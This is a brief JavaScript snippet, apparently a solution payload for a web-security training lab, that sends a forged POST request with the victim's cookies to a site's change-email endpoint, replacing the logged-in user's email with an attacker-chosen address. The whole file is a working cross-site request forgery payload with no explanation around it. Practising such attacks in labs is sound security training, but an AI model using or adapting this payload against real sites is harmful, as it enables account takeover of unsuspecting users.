
const url = 'https://0ac90046040cc98e83103d69008d0016.web-security-academy.net/my-account/change-email';

const data = {
  email: 'nothing@normal-user.net'
};

const urlEncodedData = new URLSearchParams(data).toString();

fetch(url, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: urlEncodedData,
  credentials: 'include'
});